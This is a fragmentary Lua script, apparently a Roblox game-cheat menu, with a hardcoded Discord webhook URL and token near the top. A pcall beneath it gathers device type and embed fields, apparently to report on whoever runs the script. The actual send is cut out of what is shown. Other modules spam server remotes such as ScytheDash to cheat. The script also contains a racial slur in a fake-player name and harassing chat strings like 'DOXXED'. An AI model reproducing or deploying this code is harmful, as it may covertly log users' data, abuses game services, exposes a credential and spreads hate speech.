...
local webh = "https://discord.com/api/webhooks/1149888324396392508/CSEk1Dx9HWPqG5aDVwUsLmb8zjX2TqnVB9mq_13jrleY5RYHIy7QepGknWNB2URNrMd8"
pcall(function()
    local deviceType = ""
    ...
    local data = {
        ['embeds'] = {
            {
                ['title'] = 'amongus sussy baka',
                ['description'] = 'fortnite webhook',
                ['fields'] = {
...
do
	...
	local textlabel = Instance.new("TextLabel")
	textlabel.Size = UDim2.new(1, 0, 0, 36)
	textlabel.Text = "NARUTOOOOOOOOOOOOOOOOOOOOOO V4"
	textlabel.BackgroundTransparency = 1
	textlabel.ZIndex = 10
	textlabel.TextStrokeTransparency = 0
...
runFunction(function()
	...
	local anims = {
		...
		Normal = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 2},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 2}
		},
		Slow = {
...
local fakeplr = {["Name"] = "Mastaskid Fan", ["UserId"] = "239702688"}
local otherfakeplayers = {["Name"] = "Niggers", ["UserId"] = "1"}
...
local Messages = {"INF", "69", "420", "COEMS", "DOXXED", "GET FUCKED"}
local old
local FunnyIndicator = {Enabled = false}
FunnyIndicator = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
Name = "INF Damage",
Function = function(Callback)
...
runFunction(function()
    BetterScythe = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
        Name = "ScytheBypass",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    repeat
                        ...
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                        until (not BetterScythe.Enabled)
                    end)
            end
        end
    })
...
runFunction(function()
    local ScytheLongJump = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
        ...
        Function = function(callback)
            if callback then
		wait(0.5);local Frame = Instance.new("Frame")
		local ImageLabel = Instance.new("ImageLabel")
		Frame.Parent = game.StarterGui.ScreenGui
		Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0.0299051795, 0, 0.0305882357, 0)
		Frame.Size = UDim2.new(0, 274, 0, 268)
		ImageLabel.Parent = Frame
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.BorderSizePixel = 0
		ImageLabel.Size = UDim2.new(0, 274, 0, 268)
		ImageLabel.Image = "rbxassetid://14630034520"
            end
        end
    })
end)
